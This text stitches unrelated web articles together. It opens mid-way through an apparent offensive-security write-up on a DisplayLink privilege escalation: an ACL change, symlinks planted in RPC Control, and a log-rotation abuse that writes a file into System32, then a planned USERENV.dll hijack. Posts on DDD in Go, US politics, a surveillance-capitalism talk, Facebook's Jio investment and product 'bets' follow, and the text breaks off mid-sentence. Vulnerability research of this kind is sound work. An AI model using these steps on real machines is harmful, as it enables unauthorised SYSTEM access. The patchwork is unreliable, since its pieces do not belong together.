<li>From <code>C:\Program Files\DisplayLink Core Software\Debug\DisplayLinkManager.old.log</code> to the place where we want to put our file</li>
</ul>
<p>However, for this to work, the <code>Debug</code> folder must be empty, as the
<code>CreateSymlink.exe</code> program will replace it with a mount point to
<code>\RPC Control</code>. And if we try to delete the log files present in
<code>Debug</code>, we get the following error:</p>
<p><img alt="The action can't be completed because the file is open in DisplayLinkManager" src="https://offsec.almond.consulting/images/displaylink-usb-graphics-arbitrary-file-write-eop/displaylink_delete_logs_error.png"></p><p>While we have <code>Full Control</code> over the folder and its content, because the
log files are opened by the DisplayLink Manager process, we can't remove them.
And we can't stop the DisplayLink Manager process, because it runs as
<code>SYSTEM</code>, and we're just a poor unprivileged user!</p>
<p>So, how can we bypass this? Well, since we have <code>Full Control</code> over the
<code>Debug</code> folder, we can change its ACL. For example, we can change it so
that <code>SYSTEM</code> does not have modification rights over this folder and its
content:</p>
<p><img alt="We changed the ACL on Debug, so that SYSTEM does not have modification rights on the folder" src="https://offsec.almond.consulting/images/displaylink-usb-graphics-arbitrary-file-write-eop/debug_folder_acl_changed.png"></p><p>Now, when the machine is rebooted, the DisplayLink Manager won't be able to
open its log files in the folder, and we can delete them. We can also delete
<code>DisplayLinkUserAgent.log</code>. This file is opened by the DisplayLink User
Agent application, which also runs as <code>SYSTEM</code>.</p>
<p>As <code>DisplayLinkUI.log</code> and <code>DisplayLinkUIAddOnApi.log</code> are opened
by the DisplayLink UI Systray application, which runs with our current user's
rights, so we can just kill it in the task manager, and delete the log files.</p>
<p><img alt="We kill DisplayLinkUI.exe in the task manager. Good night, sweet prince." src="https://offsec.almond.consulting/images/displaylink-usb-graphics-arbitrary-file-write-eop/displaylink_ui_terminate_process.png"></p><p>After that, you get one, clean, and totally empty, <code>Debug</code> folder:</p>
<p><img alt="The Debug folder is now empty" src="https://offsec.almond.consulting/images/displaylink-usb-graphics-arbitrary-file-write-eop/debug_folder_empty.png"></p><p>Now, we can go and try to exploit the process. We'll try to move a file we
control to <code>C:\Windows\System32</code>. By observing the sizes of the log
files, we noticed that log rotation occurs when the log file goes over 101 Kb,
so we'll make sure that our custom file is over that size.</p>

</pre></div>
<p>Our target file has an extension of <code>.dll</code> just to prove that we can
fully control the name.</p>
<p><strong>NB: When creating the symlink, make sure that no other process is currently
accessing the Debug folder. That includes explorer.exe windows open inside the
folder or with a quick access pin to it. It will save you a few headaches...</strong></p>
<p>If we look at objects created in <code>\RPC Control</code>, we can see our
"log files". To do so, we use <code>WinObj.exe</code>, from the <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">Sysinternals Suite</a>.</p>
<p><img alt="We can see our symlinks using WinObj.exe" src="https://offsec.almond.consulting/images/displaylink-usb-graphics-arbitrary-file-write-eop/winobj_symlinks.png"></p><p>Now, we can just log off our account, log back in, aaaand:</p>

<p>We have our arbitrary file write! Here's the Procmon entries showing the log
rotation that moves our arbitrary file into the <code>system32</code> folder:</p>
<p><img alt="Procmon view of the log rotation which moved our arbitrary file" src="https://offsec.almond.consulting/images/displaylink-usb-graphics-arbitrary-file-write-eop/displaylink_log_rotation_abuse_poc.png">
</p></div>
<div id="looking-for-the-missing-dll">
<h3>Looking for the missing DLL</h3>
<p>So, how can we exploit this arbitrary file to elevate our privileges? The first
path we explored was trying to replace <code>sethc.exe</code> with <code>cmd.exe</code>,
to pop a shell with the sticky keys.</p>
<p>However, a <code>SYSTEM</code> system process does not have the right to modify these
files, you need to be <code>TrustedInstaller</code> (there are <a href="https://www.tiraniddo.dev/2017/08/the-art-of-becoming-trustedinstaller.html">techniques</a>
to achieve this when you're already privileged, but these can't be used on a
process we don't have control over).</p>
<p>So we took another path. We looked at the DLL that DisplayLink Manager tries
to load but fails, because they are not in the location the loader tries to
load them from first (following the standard <a href="https://msrc-blog.microsoft.com/2014/05/13/load-library-safely/">DLL load order</a>). The idea
was to replace one of these missing DLLs with our own, using a straightforward
DLL hijack to gain arbitrary code execution as <code>SYSTEM</code>.</p>
<p>So, we fired up ProcMon, and searched for DLLs that were unsuccesfully loaded
by DisplayLink Manager:</p>
<p><img alt="DisplayLink Manager tries to load several missing DLLs" src="https://offsec.almond.consulting/images/displaylink-usb-graphics-arbitrary-file-write-eop/displaylink_missing_dlls.png"></p><p>We can see that DisplayLink Manager tries to load several DLLs that seem to be
missing from its folder, such as <code>VERSION.dll</code>, <code>USERENV.dll</code>, or
<code>dbghelp.dll</code> (aka the usual suspects in DLL hijacks).</p>
<p>Now, if we managed to create a file, say, <code>C:\Program Files\DisplayLink Core Software\USERENV.dll</code>,
we could gain code execution as <code>SYSTEM</code>. Any of these DLLs could be
targeted, my choice fell on <code>USERENV.dll</code>.</p>
<p>To create the malicious DLL, we take a look at the functions that DisplayLink
Manager is importing from <code>USERENV.dll</code>. For that, I'll use <a href="https://ntcore.com/?page_id=388">CFF Explorer</a>.</p>
<p><img alt="Looking at DisplayLink imports in CFF Explorer" src="https://offsec.almond.consulting/images/displaylink-usb-graphics-arbitrary-file-write-eop/displaylink_cff_explorer.png"></p><p>Several functions are imported from <code>USERENV.dll</code>, to wit,
<code>DestroyEnvironmentBlock</code>, <code>LoadUserProfileW</code>,
<code>UnloadUserProfile</code>, <code>LoadUserProfileA</code>, and
<code>CreateEnvironmentBlock</code>.</p>
<p>We can then create a DLL that exports these functions, but will actually call
the command we want to execute. The code for my DLL is inspired by <a href="https://liberty-shell.com/sec/2019/03/12/dll-hijacking/">this post</a> on DLL hijacking:</p>
<div><pre><span></span><span>// dllmain.cpp : Defines the entry point for the DLL application.</span>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>When I started working in Go, the community was not looking positively on techniques like DDD (Domain-Driven Design) and Clean Architecture.
I heard multiple times: <em>“Don’t do Java in Golang!", “I’ve seen that in Java, please don’t!"</em>.</p><p>These times, I already had almost 10 years of experience in PHP and Python. I’ve seen too many bad things already there.
I remember all these “Eight-thousanders” (methods with +8k lines of code 😉) and applications that nobody wanted to maintain.
I was checking old git history of these ugly monsters, and they were looking harmlessly at the beginning.
But with time, small, innocent problems started to become more significant and more serious.
<strong>I’ve also seen how DDD and Clean Architecture solved these issues.</strong></p><p>Maybe Go is different? Maybe writing microservices in Go will fix this issue?</p><h3 id="it-was-supposed-to-be-so-beautiful">It was supposed to be so beautiful</h3><p>Now, after exchanging experience with multiple people and having the ability to see a lot of codebases, my point of view is a bit cleaner than 3 years ago.
Unfortunately, I’m now far from thinking that just using Golang and microservices will save us from all of these issues that I’ve encountered earlier.
I started to actually have flashbacks from the old, bad times.</p><p>It’s less visible because of the relatively younger codebase.
It’s less visible because of the Golang design.
But I’m sure that with time, we will have more and more legacy Golang applications that nobody wants to maintain.</p><p>Fortunately, 3 years ago, despite to chilly reception I didn’t give up.
I decided to try to use DDD and related techniques that worked for me previously in Go.
With Milosz we were leading teams for 3 years that were all successfully using DDD, Clean Architecture, and all related, not-popular-enough techniques in Golang.
<strong>They gave us the ability to develop our applications and products with constant velocity, regardless of the age of the code.</strong></p><p>It was obvious from the beginning, that <strong>moving patterns 1:1 from other technologies will not work</strong>.
What is essential, we did not give up idiomatic Go code and microservices architecture - they fit together perfectly!</p><p>Today I would like to share with you first, most straightforward technique – DDD lite.</p><h3 id="state-of-ddd-in-golang">State of DDD in Golang</h3><p>Before sitting to write this article, I checked a couple of articles about DDD in Go in Google.
I will be brutal here: they are all missing the most critical points making DDD working.
<strong>If I imagine that I would read these articles without any DDD knowledge, I would not be encouraged to use them in my team.
This superficial approach may also be the reason why DDD is still not socialized in the Go community.</strong></p><p>During this series, we try to show all essential techniques and do it in the most pragmatic way.
Before describing any patterns, we start with a question: what does it give us?
It’s an excellent way to challenge our current thinking.</p><p>I’m sure that we can change the Go community reception of these techniques with this cycle of articles.
We believe that they are the best way to implement complex business projects.
<strong>I believe that we will help to establish the position of Go as a great language for building not only infrastructure but also business software.</strong></p><h3 id="you-need-to-go-slow-to-go-fast">You need to go slow, to go fast</h3><p>It may be tempting to implement the project you work on in the simplest way.
It’s even more tempting when you feel pressure from “the top”.
Are we using microservices, though?
If it is needed, will we just rewrite the service?
I heard that story multiple times, and it rarely ended with a happy end. 😉
<strong>It’s true that you will save some time with taking shortcuts. But only in the short term.</strong></p><p>Let’s consider the example of tests of any kind.
You can skip writing tests at the beginning of the project.
You will obviously save some time and management will be happy.
<strong>Calculation seems to be simple – the project was delivered faster.</strong></p><p>But this shortcut is not worthwhile in the longer term.
When the project grows, your team will start to be afraid of making any changes.
In the end, the sum of time that you will spend will be higher than implementing tests from the beginning.
<strong>You will be slow down in the long term because of sacrificing quality for quick performance boost at the beginning.</strong>
On the other hand - if a project is not critical and needs to be created fast, you can skip tests.
It should be a pragmatic decision, not just <em>“we know better, and we are not creating bugs”</em>.</p><p>The case is the same for DDD.
When you want to use DDD, you will need a bit more time in the beginning, but long-term saving is enormous.
However, not every project is complex enough to use advanced techniques like DDD.</p><p><strong>There is no quality vs. speed tradeoff. If you want to go fast in the long term, you need to keep high quality.</strong></p><p><img src="https://threedots.tech/media/ddd-lite/quality-fowler.png" alt="Is quality worth cost?"></p><h3 id="thats-great-but-do-you-have-any-evidence-if-that-is-working">That’s great, but do you have any evidence if that is working?</h3><p>If you asked me this question two years ago, I would say: <em>“Well, I feel that’s working better!"</em>.
But just trusting my words may be not enough. 😉
<strong>There are many tutorials showing some dumb ideas and claiming that they are working without any evidence – let’s don’t trust them blindly!</strong></p><p>Just to remind: if someone has a couple thousand Twitter followers, <a href="https://en.wikipedia.org/wiki/Authority_bias" target="_blank">that alone is not a reason to trust them</a>!</p><p>Fortunately, 2 years ago <a href="https://www.amazon.com/Accelerate-Software-Performing-Technology-Organizations/dp/1942788339" target="_blank"><em>Accelerate: The Science of Lean Software and DevOps: Building and Scaling High Performing Technology Organizations</em></a> was released.
In brief, this book is a description of what factors affect development teams’ performance.
But the reason this book became famous is that it’s not just a set of not validated ideas – <strong>it’s based on scientific research.</strong></p><p><strong>I was mostly interested with the part showing what allows teams to be top-performing teams.</strong>
This book shows some obvious facts, like introducing DevOps, CI/CD, and loosely coupled architecture, which are all an essential factor in high-performing teams.</p><p>What is Accelerate telling us about top-performing teams?</p><blockquote><p>We found that high performance is possible with all kinds of systems, provided that systems and the teams that
build and maintain them—are loosely coupled.</p></blockquote><blockquote><p>This key architectural property enables teams to easily test and deploy individual components or services even
as the organization and the number of systems it operates grow—that is, it allows organizations to increase their
productivity as they scale.</p></blockquote><p>So let’s use microservices, and we are done? I would not be writing this article if it was enough. 😉</p><blockquote><ul><li>Make large-scale changes to the design of their system without depending on other teams to make changes in
their systems or creating significant work for other teams Complete their work without communicating and
coordinating with people outside their team</li><li>Deploy and release their product or service on demand, regardless of
other services it depends upon Do most of their testing on demand, without requiring an integrated test
environment Perform deployments during normal business hours with negligible downtime</li></ul></blockquote><blockquote><p>Unfortunately, in real life, many so-called service-oriented architectures don’t permit testing and deploying
services independently of each other, and thus will not enable teams to achieve higher performance.</p></blockquote><blockquote><p>[…] employing the latest whizzy microservices architecture deployed on containers is no guarantee of higher
performance if you ignore these characteristics. […]
To achieve these characteristics, design systems are loosely coupled — that is, can be changed and validated independently of each other.</p></blockquote><p><strong>Using just microservices architecture and splitting services to small pieces is not enough.
If it’s done in a wrong way, it’s adding extra complexity and slowing teams down.</strong>
DDD can help us here.</p><p>I’m mentioning DDD term multiple times. What DDD actually is?</p><h2 id="what-is-ddd-domain-driven-design">What is DDD (Domain-Driven Design)</h2><p>Let’s start with Wikipedia definition:</p><blockquote><p>Domain-driven design (DDD) is the concept that the structure and language of your code (class names, class methods, class variables) should match the business domain. For example, if your software processes loan applications, it might have classes such as LoanApplication and Customer, and methods such as AcceptOffer and Withdraw.</p></blockquote><p><img src="https://threedots.tech/media/ddd-lite/no-god-please-no.jpg" alt="No, God please no!"></p><p>Well, it’s not the perfect one. 😅 It’s still missing some most important points.</p><p>It’s also worth to mention, that DDD was introduced in 2003.
That’s pretty long time ago.
Some distillation may be helpful to put DDD in the 2020 and Go context.</p><p><img src="https://threedots.tech/media/ddd-lite/eric-evans.jpg" alt="Eric Evans - creator of DDD"></p><p>Eric Evans - the creator of DDD.<br>Please print this and hang over the bed to receive +10 DDD blessing.</p><p>My simple DDD definition is: Ensure that you solve <strong>valid problem</strong> in the <strong>optimal way</strong>.
After that <strong>implement the solution in a way that your business will understand without any extra translation from technical language needed</strong>.</p><p>How to achieve that?</p><h3 id="coding-is-a-war-to-win-you-need-a-strategy">Coding is a war, to win you need a strategy!</h3><p>I like to say that <em>“5 days of coding can save 15 minutes of planning”</em>.</p><p>Before starting to write any code, you should ensure that you are solving a valid problem.
It may sound obvious, but in practice from my experience, it’s not as easy as it sounds.
This is often the case that the solution created by engineers is not actually solving the problem that the business requested.
A set of patterns that helps us in that field are named <strong>Strategic DDD patterns</strong>.</p><p>From my experience, DDD Strategic Patterns are often skipped.
The reason is simple: we are all developers, and we like to write code rather than talk to the <em>“business people”</em>. 😉
Unfortunately, this approach when we are closed in a basement without talking to any business people has a lot of downsides.
Lack of trust from the business, lack of knowledge of how the system works (from both business and engineering side), solving wrong problems – these are just some of the most common issues.</p><p>The good news is that in most cases it’s caused by a lack of proper techniques like Event Storming. They can give both sides advantages.
What is also surprising is that talking to the business may be one of the most enjoyable parts of the work!</p><p>Apart from that, we will start with patterns that apply to the code.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3389">

<div>
<p>Those that know me, know that I am both bold and resolute. I stand by my thoughts / comments, yet I attempt to keep an open mind, analyze a situation, self-reflect on any biases, and integrate feedback. I even go so far as to analyze my confidence level, see <a href="https://predictionbook.com/" target="_blank" rel="noopener noreferrer">predictionbook.com</a>.</p>
<p>With that in mind. I want to share how utterly angry and helpless I feel —</p>
<p>I can’t share my true thoughts, hell my analysis, of the current political situation in the U.S. Although I have written on it countless times, I end up deleting the posts.</p>
<p>Why?</p>
<p>It’s not safe to share thoughts.</p>
<h2>State of Affairs</h2>
<p>Today, sharing one’s opinion can cost you your livelihood, your ability to communicate, and more.</p>
<p>Historically, that was always true, perhaps more-so. We’re now returning to the status quo — repression.</p>
<p>Today’s flavor of repression is one where offending someone randomly across the globe, can cost you your job. That person may not have a standing in your community and may not have a relationship with your employer. However, they can amplify their voice, tweet your employer, and your employer (scared out of it’s mind by the current situation) will terminate you. That is the state of affairs today. It doesn’t matter if you’re correct or innocent. It doesn’t even matter if 99.9% of people aren’t offended by what you said — we are now in a world of “<a href="https://en.wikipedia.org/wiki/Online_shaming#Cancellation" target="_blank" rel="noopener noreferrer">cancel culture</a>“.</p>
<h2>Finding Middle Ground</h2>
<p>In the United States in 2020, we have two paths. One path leads to an ever more left-leaning populous “uprising”; the other path leads to an ever more right-leaning populous “uprising”. I don’t see an alternative, outside of some quite-frankly comical alternatives (e.g. President Mitt Romney, with VP Bernie Sanders).</p>
<p>One way or another, I lose. No one is speaking up for my beliefs or representing me.</p>
<p>I sense I’m not alone. Everyone I speak to left or right, hates the current state of affairs. Most of us even agree on <em>why</em> we distrust the system. Unfortunately, we can’t elect someone to fix the system. Neither Trump, nor Biden, nor Bernie, nor anyone on the ballot accurately represents or even inspires us.</p>
<p>By and large, I believe this is due to the “absolute” nature of our current social strife. Take the question:</p>
<blockquote><p>Why can’t I be anti-vaccine and pro-choice?</p></blockquote>
<p>You would suspect everyone would agree that we “own” our bodies. If that were true, then you would effectively have to be pro-choice AND support people’s right to choose what to put in their bodies; body ownership is the middle ground. I wish we could coalesce around the middle ground, then compromise on edge cases, enabling progress.</p>
<p>Take another example:</p>
<blockquote><p>Why don’t we do firearms training in schools?</p></blockquote>
<p>It’s an honest question — we’ve had the 2nd amendment for hundreds of years. Similar to driving a car, we should train our youth to handle firearms. I suspect we all know the reason this is not occurring — because a significant portion of the United States is fearful of firearms.</p>
<p>From the evidence, the fear is unjustified. We have evidence that with a good training program and robust mental evaluation process, firearms by-and-large are safe for society. <a href="https://en.wikipedia.org/wiki/Firearms_regulation_in_Switzerland" target="_blank" rel="noopener noreferrer">See Switzerland</a>:</p>
<blockquote><p>Swiss males grow up expecting to undergo basic military training, usually at age 20 in the recruit school..</p>
<p>…Prior to 2007, members of the Swiss Militia were supplied with 50 rounds of ammunition for their military weapon in a sealed ammo box that was regularly audited by the government…</p>
<p>…Every person with a Swiss citizenship, aged 10 years or older, can take part at any federal ranges and will be able to shoot for free with the ordinance rifle…</p>
<p>…In 2016, there were 187 attempted and 45 completed homicides, for a homicide rate of 0.50 per 100,000 population, giving Switzerland one of the lowest homicide rates in the world…</p></blockquote>
<p>Further, firearms are already widely available (<a href="https://en.wikipedia.org/wiki/Estimated_number_of_civilian_guns_per_capita_by_country" target="_blank" rel="noopener noreferrer">300+ million guns in the U.S.</a>) &amp; availability enshrined in law.</p>
<p>Sorrowfully, evidence doesn’t matter here; fear guides many. Yoda has some insights here:</p>
<blockquote><p><span data-parade-type="promoarea" data-parade-location-types="promoarea" data-parade-location-ids="article" data-parade-views="false" data-parade-touches="false" data-parade-clicks="false" data-parade-mouseovers="false">Fear is the path to the dark side. Fear leads to anger. Anger leads to hate. Hate leads to suffering.</span></p>
<p>— George Lucas (Yoda)</p></blockquote>
<h2>The False Dichotomy</h2>
<p>I don’t agree with the left or the right on many things in United States politics. In fact, I find most of the arguments a false dichotomy, designed to garner votes. To share one’s full thoughts would cause either or both sides to lash out, even though evidence may support the claims / musings.</p>
<p>Regretfully, this leaves me and many others out of the public discourse. While most of us have heard,</p>
<blockquote><p>The only thing necessary for the triumph of evil is for good men to do nothing.</p>
<p>— Edmund Burke (attributed)</p></blockquote>
<p>It’s not quite that simple and I prefer another sentiment:</p>
<blockquote><p>A man dies when he refuses to stand up for that which is right. A man dies when he refuses to stand up for justice. A man dies when he refuses to take a stand for that which is true.</p>
<p>— Martin Luther King Jr.</p></blockquote>

I am very confident few people fully agree with either side in this political theater. We have extremists on either side shouting and being amplified by social media. In truth, the vast majority of us don’t agree [fully] with either extreme. Most of us, want to “live and let live” — that’s the American way. We’re a country founded on our hatred for taxes and the desire to live free from persecution. Please, please.. Don’t let that change.</p>
<p>It’s easy to decide “what’s right” when you look at it through that lens — am I persecuting others or increasing taxes (arguably a form of persecution)? If either are true, likely we should reconsider our stance.</p>
<h2>The Chaos</h2>
<p>Today, we are edging towards chaos. We all feel it. Riots, job loss, deadly diseases, [trade] wars, homelessness… We need leadership that can unite us.</p>
<p>Unfortunately, many of our would-be leaders have opted out or have been pushed out of this system. They’ve become engineers, scientists, bloggers — too scared to share their opinions (<a href="https://en.wikipedia.org/wiki/Slate_Star_Codex" target="_blank" rel="noopener noreferrer">even shutting down</a>). To hold a nuanced opinion different from the “socially accepted” by one group or another will get you “canceled”. In this case, “canceled” can mean anything from losing your job, to losing financial platforms/instruments (i.e. PayPal, VISA, YouTube revenue, etc.), to receiving threats on your life.</p>
<p>We have an ongoing pandemic, with millions in the United States likely about to perish, the economy collapsing, and we still cannot escape the politics.</p>
<p>I’m not hopeful.</p>
<p>I have so many musings, stories, and analyses I’d like to share, but neither facts nor my opinions matter.</p>
<p>Let’s be honest —</p>
<ul>
<li>I’m a white, cisgender, straight, male</li>
<li>I work as a technical manager in a research group, at a bank</li>
<li>I’m socially liberal in many ways and conservative in others</li>
<li>I grew up lower-middle class; now, I’m upper-middle class</li>
<li>I don’t attribute myself to any political party</li>
</ul>
<p>A large number of people dismiss or overlook me because of my background. Those who don’t outright dismiss me are also not likely to support my interest(s).</p>
<h2>Meritocracy or Bust</h2>
<p>What scares me is that I am a father and I am fearful for my children’s future. I was raised with the understanding that America is a meritocracy. Regardless of your race, gender, or creed, you should have the ability to make a life in the United States,<strong><em> to build a future for your children</em></strong>. Sadly, I don’t see the same core mission today. None of the political parties or the government at large appears forward-looking, for the children. Perhaps, that’s because of a <a href="https://www.cdc.gov/nchs/nvss/births.htm" target="_blank" rel="noopener noreferrer">declining birthrate</a>, I’m not sure.</p>
<p>As someone with children, I’m pleading for a group to come together to challenge the current status quo and equitably look to improve our society. We do have systemic problems that need to be fixed. Compromises will need to be made, but I don’t believe we need sacrifices from anyone.</p>
<p>The racism and sexism needs to stop. I suspect, most of us (though, not all) want a meritocracy, a hierarchy based on merit. Unfortunately, what’s being propagated is a hierarchy based on race, sex and orientation — the under-privileged. It’s clear from the countless stories we see in the news. I am sure you are tired of the racism, as am I. That’s probably true regardless of which side of the political spectrum you fall.</p>
<p><em>No one’s</em> value to society should be assessed by their race, gender or creed. A person’s value should be based off what they have to offer to a given group, organization, or society. We can rally around that idea (that we’re all equal, differentiated on merit) and work to improve. It’s a middle ground we can [mostly] agree on. From there, we can fix the injustices.</p>
<p>What horrifies me, is that even to express that <em>“we’re all equal” </em>is a challenge to this new socio-economic hierarchy. <em>No one</em> is representing me or has my family’s best interests in mind. Realistically, I don’t expect anyone to have <em>my family’s interests</em> in mind, but I don’t want my potential / rights eroded.</p>
<p>Due to this political tug of war, both sides of the political spectrum want to diminish our rights; they’re only bickering over which rights to diminish. Let’s stop this tug of war and come together.</p>
<p>If we don’t come together, soon enough we won’t have a democracy, or frankly, a future to build for.</p>
<h2>In the Words of John Adams…</h2>
<blockquote><p>Remember, democracy never lasts long. It soon wastes, exhausts, and murders itself. There never was a democracy yet that did not commit suicide. It is in vain to say that democracy is less vain, less proud, less selfish, less ambitious, or less avaricious than aristocracy or monarchy. It is not true, in fact, and nowhere appears in history. Those passions are the same in all men, under all forms of simple government, and when unchecked, produce the same effects of fraud, violence, and cruelty. When clear prospects are opened before vanity, pride, avarice, or ambition, for their easy gratification, it is hard for the most considerate philosophers and the most conscientious moralists to resist the temptation. Individuals have conquered themselves. Nations and large bodies of men, never.</p>

<h2 id="details">Details</h2>
<p>This is the talk on moving beyond surveillance capitalism with alternatives, stopgaps, and the Small Web that Aral gave at <a href="https://creativemornings.com/talks/aral-balkan">Creative Mornings Istanbul</a> on 26 June, 2020.</p>
<p>The recording of the live stream has been edited to:</p>
<ul>
<li>
<p>Fix the 3-frame audio/video sync (live and learn: all HDMI output has a delay and if you are bringing in your microphone separately, you need to delay it while streaming/recording it).</p>
</li>
<li>
<p>Reduce audio levels (like a rookie, I didn’t check my levels before starting the live stream so the audio is clipped. Can’t fix that but I lowered the audio track so at least now it’s not booming in your ears.)</p>
</li>
<li>
<p>Cut out a part of my bumbling conclusion where I forgot the switcher on my screen instead of switching to my camera and then did a second awkward conclusion to camera when I realised.</p>
</li>
</ul>
<p>We’ve also added closed captions (made using thisten.co), chapters (so you can skim/jump to relevant sections), and links to the tools mentioned in the talk.</p>
<p>All in all, not terrible for a first live stream with our new live stream setup.</p>

<p>In the&nbsp;<a target="_blank" href="https://thezentech.co/2020/05/25/are-online-ads-a-bubble-seriously/" rel="noreferrer noopener">previous essay</a>, I talked about that Facebook’s primary revenue source is from online ads.</p>



<blockquote><p>Well, there is no easy way to say that, but 98% of Facebook revenue is coming from online ads. So it’s not a big surprise that they are one of the most affected companies by both surges of usage as people are using Facebook, Instagram, Whatsapp more heavily, and decrease of marketing spend on ads on its platform. So ads for Facebook are basically a matter of existence.</p></blockquote>



<p>So It is smart – or a strategic necessity as I will explain in a minute – that they are trying to find different revenue streams.</p>



<p>In the last Facebook’s earnings call, Mark Zuckerberg said:</p>



<blockquote><p>I have always believed that in times of economic downturn, the right thing to do is to keep investing in building the future, and I believe this for a few reasons. First, when the world changes quickly, people have new needs and that means that there are more new segments to build. Second, since many big companies will pull back on their investments, there are a lot of things that wouldn’t otherwise get built, but that we can help deliver.[..] we’re planning to hire at least 10,000 more people in product and engineering roles this year, so we can continue building and making progress.</p><cite>Mark Zuckerberg – Facebook earnings call 2020 Q1</cite></blockquote>



<p>Afterward, Facebook invested $5.7 billion for a 9.99% stake in India’s Reliance Jio Platforms as the largest single investment in Facebook’s history.</p>



<p>Jio Platforms is connecting more than 388 million people in India to the internet. And if we look at the following chart. The number of internet India is so high in comparison with the US and EU.</p>

<div><p>That is not the first try from Facebook to enter the Indian market. They saw India as the future for growth since 2013. But their attempts failed in 2016 after regulation blockers over Free Internet Initiative and providing payment solution for WhatsApp.</p><p>This time they tried a different approach by partnering with Reliance Jio, the largest telecom provider in India, To avoid getting in conflict with the Indian government direction to empower the Indian companies.</p></div>



<p>This investment has three main strategic advantages:</p>



<h3>1- Facebook + Instagram vs. TikTok</h3>



<p>In recent years, TikTok, the app owned by the Chinese giant ByteDance has got a market share in India that all the US Tech companies – including Facebook – couldn’t acquire.</p>



<blockquote><p>In recent years, ByteDance’s TikTok has won users that all of these companies have struggled to reach. TikTok has amassed more than 250 million users in India (as of last year), and the company says it is on track to add another 100 million this year.</p><cite>TechCrunch</cite></blockquote>



<p>But not just in India. Tiktok already got a significant market share in many different countries as a social platform. And I think Facebook bearly started to take any action against the viral usage of Tiktok, especially between teenagers.</p>



<p>That’s the first reason which serves – still – into increasing Ads revenue stream. But in general, Facebook couldn’t monetize the increasing users’ usage in Asia compared to users in the US and Europe.</p>

<p>So that leads us to the second strategic advantage.</p>



<h3><strong><strong>2- E-commerce via WhatsApp and an opportunity for a SuperApp</strong></strong></h3>



<p>In one of the future essays, I want to dig deeper into the story of WeChat, the Chinese SuperApp. And this related to today’s essay since Facebook has an opportunity to transfer WhatsApp into a similar user experience in the Indian market. The same try that Careem – now owned by Uber – is seeking in the Middle East. See the market pattern?</p>



<p>Reliance Jio also wants to take on Amazon in e-commerce in India, but to take on Amazon, they can’t play like Amazon! As Brad Pitt stated in Moneyball in a different context about the Yankees.</p>

<p>WhatsApp is already popular in India, but as I mentioned before, Facebook couldn’t pass the regulation to add payment service to WhatsApp to be able to monetize it. But after the partnership, Facebook could enter the e-commerce market in India much more comfortably. Either with more government-friendly WhatsApp solution or via JioMart service. As Mukesh Ambani (Reliance Jio’s largest shareholder) referred to in the deal announcement:</p>



<blockquote><p>Ambani added that JioMart and WhatsApp will enable 30 million neighborhood stores (kirana) to transact digitally “in the near future.” WhatsApp has been working with the Indian government for more than two years to expand its payments service in India — but the project remains stuck in regulatory hurdles.</p><cite>Mukesh Ambani</cite></blockquote>



<p>Facebook introduced WhatsApp for business a few months ago. And as they described, the main feature in WhatsApp blog is adding products catalog inside WhatsApp, so users don’t need to go to external websites. Then all from products exploring to payment process (later on) could be done entirely within WhatsApp experience.</p>



<blockquote><p>Catalogs are a mobile storefront for businesses to showcase and share their goods so people can easily browse and discover something they would like to buy. Previously businesses had to send product photos one at a time and repeatedly provide information — now customers can see their full catalog right within WhatsApp. This makes business owners look more professional and keeps customers engaged in the chat without having to visit a website.</p><cite>WhatsApp blog</cite></blockquote>



<p>Fun note, the feature demo in WhatsApp blog is for a local Indian store. Good one WhatsApp 😉</p>

<h3><strong>3- Reliance Jio + Facebook vs. Amazon</strong></h3>



<blockquote><p>With only about half of India’s 1.3 billion people online so far, e-commerce sales are projected to more than double to $68.4 billion by 2022 from $26.9 billion in 2018</p><cite>Wall Street Journal</cite></blockquote>



<p>With the promising opportunity in India, someone else was watching. Who knows a lot about e-commerce, Jeff Bezos.</p>



<p>Jeff Bezos visited India recently to announce an extra $1 Billion investment – after the initial investment $5 Billion -, and told a gathering of local Amazon sellers:</p>



<blockquote><p>The intent is to help more small businesses start selling on the company’s marketplace. The new funds will supplement the $5 billion that Amazon has said it is spending to build out its Indian business […] We’re making this announcement now because it’s working,” Mr. Bezos said referring to Amazon’s efforts to get India’s legions of mom-and-pop shops connected to its platform. “And when something works, you should double down on it.”</p><cite>Wall Street Journal</cite></blockquote>



<p>It’s interesting to see and learn from what’s happening in India in the near future since similar competition fields happen in other places like in Africa or the Arabic world while big tech companies are looking to the east for strategic opportunities.</p>

You can have big bets, small bets, safe bets, or risky bets. There is also an element of time: bets can have different durations. You can have really, really short bets that might be short, but still very large. And you can have really long-evolving bets that might take a very long time to mature. At any given time, a company will have a portfolio of bets developing in parallel that are all interlinked and related in some way. </p><p>You might ask, “Why is it important to think in terms of bets?” The simplistic answer is, “We’re making an investment, and we want a really good return on that investment.” That is true, but the usefulness of thinking in terms of bets is that the different types of bets, the shape of bets, and the relatedness of bets are very pertinent to product development. There are helpful mental models for what we’re doing.</p><p>Some bets take a long time to mature. A startup might be based on one, two or three core fundamental ideas. Although you want to update your beliefs as you start to accumulate data, some things just take a while to mature. It takes you time to understand what’s actually going on. That’s a really good example of how thinking about those fundamental aspects of your company and making those very clear to the people you’re working with can both inspire them to help you update your prior understanding—what information you have relating to those bets—but also help you to communicate the real direction. A classic problem when someone joins a startup is that they come in and appraise what’s going on and say, “Why do we believe that? It seems a little risky. Should we challenge that idea? Should we challenged that other idea?” Often, what they don’t realize is that people have gone through that particular thought process and have decided where to make operating assumptions and have decided if these are bets that they want to play. They’ve decided what they know to be risky and what they know to be safe for this case.</p><p>When you can communicate those bets and beliefs to someone who is just joining the company, you save them the hassle of not understanding the thought process of the people who founded the company. The other important thing when you think in terms of bets—as anyone who plays games of skill that involve betting knows—is that there are better ways to place your bets. There are often better ways to play those games. If we have an opportunity to create a game where we can bet more incrementally instead of a big batch bet, of course we’re going to try to create an environment where that is possible.</p><p>Some things don’t work like that. Sometimes we don’t have that opportunity, but if we at least understand the game and the bets we’re making, it challenges us to think about the potential for changing how we play that particular game. Another key benefit is that it’s tempting to try to take a one-size-fits-all approach to all the work we’re doing. And just when we try to think about the various bets that we make in our lives or in other areas, we realize that there’s an almost infinite number of variations of these styles of bets.</p><p>Yes, they can be sorted into a few  categories. and there are some models that encourage you to think about certain categories of bets for your company. But it really makes you aware that you need an adaptive approach to working on these things, otherwise you’re going to try to treat everything in the exact same way. Underscoring this idea of the interrelatedness of your bets and their circumstances is that you can have core beliefs that then filter all the way up into the work that’s happening right now. You can have bets across one to three decades, or a series of bets and beliefs that impact the work that you’re doing right now. That 